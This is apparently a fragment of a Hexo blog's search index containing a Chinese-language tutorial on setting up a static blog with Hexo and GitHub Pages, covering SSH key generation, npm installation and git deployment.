class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hexo + github 搭建博客</title>
      <link href="/2023/03/05/Hexo%20+%20github%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2023/03/05/Hexo%20+%20github%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>背景：因为最近打算开始弄个博客用于记录生活和学习&amp;研究内容的平台，博客无疑是一个很好的记录方式，由于以前用服务器搭建有服务端后台功能的博客发现不够安全且需要为服务器付费，所以现在就有了使用GitHub的存储库page来静态访问博客（足够安全和无后台服务端、无需为服务器续费，誒~ 解决方案安排的妥妥哒）的想法，在hexo博客框架下使用cactus主题的博客搭建，存放到GitHub仓库可省去服务器的费用 白嫖快乐！</p><h2 id="新建GitHub仓库"><a href="#新建GitHub仓库" class="headerlink" title="新建GitHub仓库"></a>新建GitHub仓库</h2><img src="https://s2.loli.net/2023/03/07/6OyMsXql3t4k8PK.png" alt="image-20230307005340246.png" style="float:left;" /><br><img src="https://s2.loli.net/2023/03/07/ojfb3n7aYLmxdFr.png" alt="image-20230307005520483.png" style="float:left;" /><h2 id="生成SSH密钥"><a href="#生成SSH密钥" class="headerlink" title="生成SSH密钥"></a>生成SSH密钥</h2><p>本地生成ssh公钥命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;GitHub邮箱&quot;</span></span><br><span class="line">按下回车三次即可生成在C:\Users\xxxx\.ssh目录下</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2023/03/07/FYitZ92zcQbmRAh.png" alt="image-20230307005939890.png" style="float:left" />打开id_rsa.pub文件即可看到生成出来的公钥<img src="https://s2.loli.net/2023/03/07/f1HUvhpN4LDgtIl.png" alt="image-20230307010126008.png" style="float:left" />GitHub绑定公钥<img src="https://s2.loli.net/2023/03/07/Hsmht3VYokTfCS8.png" alt="image-20230307010333153.png" style="float:left" />测试公钥是否绑定GitHub命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>看到以下提示即成功绑定<img src="https://s2.loli.net/2023/03/07/fp15dB6SRwtaD4N.png" alt="image-20230307010619173.png" style="float:left" /><h2 id="安装hexo框架并生成博客内容"><a href="#安装hexo框架并生成博客内容" class="headerlink" title="安装hexo框架并生成博客内容"></a>安装hexo框架并生成博客内容</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g //安装</span><br><span class="line">hexo init blog//自定义博客</span><br><span class="line"><span class="built_in">cd</span> blog</span><br><span class="line">npm install//安装项目所需要的全部包</span><br><span class="line">hexo server//启动hexo</span><br></pre></td></tr></table></figure><h2 id="提交hexo博客文件到GitHub仓库"><a href="#提交hexo博客文件到GitHub仓库" class="headerlink" title="提交hexo博客文件到GitHub仓库"></a>提交hexo博客文件到GitHub仓库</h2><p>修改本地配置文件为以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">type: git</span><br><span class="line">respository: 仓库地址</span><br><span class="line">branch:main</span><br></pre></td></tr></table></figure><p>respository为仓库项目 </p><img src="https://s2.loli.net/2023/03/07/fyeqFdVHJ83jaLQ.png" alt="image-20230307011831622.png" /><img src="https://s2.loli.net/2023/03/07/KgI3VFMmXGNiW6r.png" alt="image-20230307011429858.png" /><p>安装hexo提交工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>提交当前目录文件夹的所有文件的到仓库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g //生成博客页面</span><br><span class="line">hexo d//提交到GitHub仓库</span><br></pre></td></tr></table></figure><p>提交的过程中需要验证GitHub的token（默认自动弹窗确认账号密码 &#x2F; 直接授权给web验证），提交完成后再刷新下自己的仓库就可以看到本地的项目就已经提交上来了<br><img src="https://s2.loli.net/2023/03/07/j1vwXJmNUAxaieq.png" alt="image-20230307012212388.png" style="float:left" /></p><p>我们访问以下提交上来的博客地址：xxxx.github.io<br><img src="https://s2.loli.net/2023/03/07/VyEdrDobqJWnk1j.png" alt="image-20230307012531949.png" style="float:left" /><br>后期再进行优化，就先这样 下课！</p>]]></content>
      
      
      <categories>
          
          <category> blog杂记 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
